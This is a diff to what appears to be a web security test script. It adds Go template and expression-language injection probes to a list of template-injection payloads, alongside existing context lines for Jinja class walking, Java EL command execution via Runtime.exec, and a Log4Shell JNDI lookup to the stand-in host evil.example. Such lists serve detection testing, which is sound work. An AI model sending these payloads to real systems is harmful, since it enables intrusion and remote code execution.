@@ -135,6 +135,12 @@ q $A ssti "jinja config"               "{{config.items()}}"
 q $A ssti "jinja rce"                  "{{''.__class__.__mro__[1].__subclasses__()}}"
 q $A ssti "java el"                    "\${T(java.lang.Runtime).getRuntime().exec('id')}"
 q $A ssti "go template"                "{{ .Env }}"
+# Aegolith: Go template actions and EL expressions (G3).
+q $A ssti "go printf action"           "{{printf \"%v\" .}}"
+q $A ssti "go call action"             "{{ call .Func }}"
+q $A ssti "go define action"           "{{define \"x\"}}{{.}}{{end}}"
+q $A ssti "el arithmetic"              "\${7*7}"
+q $A ssti "el member access"           "\${user.password}"
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
